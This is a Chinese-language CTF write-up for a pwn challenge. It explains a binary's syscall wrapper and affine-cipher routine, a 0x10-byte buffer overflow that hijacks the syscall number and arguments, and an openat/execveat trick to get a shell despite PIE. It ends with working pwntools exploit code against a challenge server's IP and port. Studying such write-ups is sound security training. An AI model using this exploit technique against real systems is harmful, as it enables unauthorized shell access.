考点：**Linux 系统调用**

系统调用（syscall）是 Linux 内核向用户程序提供的一套接口（API），主要实现了一些比较低层的操作，如文件处理、进程管理和内存管理等。

*注：本题环境为 x86-64 架构。不同架构下，系统调用的方法和编号表有所不同。*

 请参考：[Linux 系统调用表(x86-64)](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)

## 程序说明

程序有两个功能：encrypt 和 decrypt，其中只有 decrypt 可用。

decrypt 的功能是：先读取`0x100`字节用户输入，逐字节进行仿射密码解密，最后将解密结果打印出来。

![image](https://user-images.githubusercontent.com/55195054/69850060-5dca2500-12b9-11ea-8773-8146afb9c3a4.png)

#### ① syscall_wrapper(&v8)

`syscall_warpper`是`syscall_safe`的包装函数，即`syscall_wrapper(&v8) -> syscall_safe(v8, v9, v10, v11) `

`syscall_safe`函数接受四个`int`变量为参数，经过简单检查后，将参数分别放入`rax`、`rdi`、`rsi`、`rdx`寄存器，然后执行`syscall`指令。

![image](https://user-images.githubusercontent.com/55195054/69850666-b817b580-12ba-11ea-8434-50eda164e25b.png)

传入`rax`寄存器的值叫做**系统调用编号**，用于指示`syscall`指令执行哪条系统调用，`rdi`、`rsi`和 `rdx`寄存器则是系统调用的前三个参数。

编号为 0 的系统调用是 **read**，结合 `v8`、`v9`、`v10` 和 `v11` 的取值，可知：

![image](https://user-images.githubusercontent.com/55195054/69850202-b1d50980-12b9-11ea-8e40-7bc628869e76.png)

所以：`syscall_wrapper(&v8) -> read(0, s, 0x100)`，即从标准输入读取 0x100 字节到缓冲区`s`。

#### ② s[i] = 0xA7 * (s[i] - 0x23)

逐字节对缓冲区`s`进行[仿射密码](https://zh.wikipedia.org/wiki/%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A2%BC)解密。

解密公式为`s[i] = 0xA7 * (s[i] - 0x23)`，可以推出对应的加密公式为`s[i] = 0x17 * s[i] + 0x23`。

#### ③ syscall_wrapper(&v4) 

同理①，`syscall_wrapper(&v4) -> syscall_safe(v4, v5, v6, v7)` 。

编号为 1 的系统调用是 **write**，结合参数取值，可知`syscall_wrapper(&v4) -> write(1, s, strlen(s))`，即打印缓冲区`s`的内容到标准输出。

## 漏洞点

decrypt 存在**缓冲区溢出漏洞**。

缓冲区`s`的长度只有`0xF0`字节。多余的`0x10`字节会覆盖到相邻的`v4`和`v5`变量上。

![image](https://user-images.githubusercontent.com/55195054/69850117-83efc500-12b9-11ea-9d0c-1f10dbf98790.png)

通过控制`v4`和`v5`，我们可以间接控制：

![image](https://user-images.githubusercontent.com/55195054/69850157-99fd8580-12b9-11ea-828d-93ffb1658dce.png)

因此，我们能够**执行任意系统调用，同时控制第一个和第三个参数**。

## 攻击思路

在 CTF Pwn 中，利用系统调用主要有两种方法：一是用 **open** + **read** 读取 flag。二是用 **execve** 获取 shell。

下面介绍一下 **open** 和 **execve** 系统调用。

```
int open(const char *pathname, int flags);

int execve(const char *pathname, char *const argv[], char *const envp[]);
```

1. **open**（编号 2）  
作用是打开文件，它有两个参数 `pathname` 和 `flags`。  
`pathname` 是文件路径的字符串地址；`flags`代表访问模式，若文件只读，可以设为 NULL。  
返回一个整数`fd`（又叫**文件描述符**）。  有了 `fd`，可以用 **read** 系统调用读取文件内容。  
```
open("/flag", NULL) = fd # 打开 /flag 文件，获得对应的文件描述符 fd
read(fd, s, xxx)         # 将 flag 读取到缓冲区 s (xxx 为缓冲区大小)
```

2. **execve**（编号 59）  
作用是切换进程，它有三个参数，除了 `pathname` 之外，其余参数可以设为 NULL。  
`pathname` 是可执行文件路径的字符串地址，通过 **execve** 系统调用，当前进程可以启动并切换到 `pathname` 对应的可执行文件上。

```
# 如果 pathname 为 "/bin/sh"，效果相当于 system("/bin/sh")，即获取 shell
execve("/bin/sh", NULL, NULL)
```

能够利用 **open** 和 **execve** 的条件是，第一个参数 `pathname` 必须是`"/flag"`或者`"/bin/sh"`字符串的地址。由于程序开启了 PIE 保护，无法知道程序的基地址，所以上述两种方法都不适用于本题。

***

```
Hint2: 257 322
```

我们需要利用两个特殊的系统调用：**openat**（编号 257）和 **execveat**（编号 322）。

```
int openat(int dirfd, const char *pathname, int flags);

int execveat(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags);
```

与 **open**、**execve** 相比，**openat**、**execveat** 多了一个名为`dirfd`的第一个参数，除此之外功能与其他参数基本上是一样的。在这里，`pathname`变成了第二个参数，恰好是缓冲区`s`地址，因此绕过了 PIE 保护。

我们主要利用了 **openat**、**execveat** 的以下特性：

* 当 `pathname`是以`/`开头的绝对路径时，`openat([任意值], [绝对路径], flags)`等同于`open([绝对路径], flags)`

* 当 `pathname` 是空字符串且 `flags` 为`AT_EMPTY_PATH`时，`execveat(fd, [空字符串], NULL, NULL, AT_EMPTY_PATH)`等同于`execve([fd 指向的文件路径], NULL, NULL)`

攻击思路：**先用 openat 获得 /bin/sh 的 fd，然后利用 execveat 启动 /bin/sh，获得 shell。**

通过调试可知，`fd`的值为3，即攻击需要执行的系统调用如下：

```
openat(NULL, sh_str, strlen(sh_str))
execveat(3, "", NULL, NULL, AT_EMPTY_PATH)
```

***

另外，我们需要确定 **openat** 第三个参数`flags`的值。


**open**/**openat** 的访问模式有三种：`O_RDONLY`（只读）、`O_WRONLY`（只写）和`O_RDWR`（读写），对应数值分别为0、1、2。

```
Hint1: -rwxr-x--- 1 root ctf 121432 Nov 11 13:26 /bin/sh
```

如上可知，远程用户对`/bin/sh`只有读权限，所以要求有`flags &（O_WRONLY | O_RDWR) == 0`，即`sh_str`需要满足条件`strlen(sh_str) & 3 == 0`。

当`sh_str`为`/bin/sh`时，由于`7 & 3 != 0`，参数不正确。

为了满足条件，可以将`sh_str`改为`//bin/sh`，这时`8 & 3 == 0`。

***

还有一个问题，**execveat** 需要控制5个参数，通过缓冲区溢出我们最多能控制前3个。

系统调用第四、第五个参数对应的寄存器为`r10`和`r8`。

仔细检查`syscall_safe`函数，可以发现出题人留下的提示：

```
.text:0000000000000884		xor	r10d, r10d // r10 == 0
.text:0000000000000887		mov	r8d, 1000h // r8  == 0x1000 (AT_EMPTY_PATH)
```
故 **execveat** 所有参数都能满足条件。


***

## 攻击过程

经过一系列调整，最终需要执行的系统调用为：

```
openat(NULL, "//bin/sh", 8)
execveat(3, "", NULL, NULL, AT_EMPTY_PATH)
```

首先打开一个远程连接
```
p = remote("34.80.207.78", 10004)
```
为了方便发送攻击 payload，我们写了一个`decrypt`函数，让 payload 发送前先经过仿射密码加密。

```
def decrypt(data):
    p.sendlineafter(">", '1')
    # 仿射密码加密
    data_enc = ''
    for c in data:
        data_enc += chr((ord(c) * 0x17 + 0x23) % 0x100)
    p.sendlineafter("context:", data_enc)
```

执行 **openat** 系统调用：

```
SYS_openat = 257
# openat(0, "//bin/sh", 8)
payload  = "//bin/sh".ljust(0xF0, '\x00')
payload += p64(SYS_openat)
payload += p64(0)
decrypt(payload)
```

执行 **execveat** 系统调用：

```
STUB_execveat = 322
fd = 3
# execveat(3, "", NULL, NULL, AT_EMPTY_PATH);
payload  = '\x00' * 0xF0 
payload += p64(STUB_execveat) 
payload += p64(fd)
decrypt(payload)
```

攻击成功后，我们可以获取一个 shell，运行命令`cat flag.txt`即可获得 flag。
```
p.interactive()
```
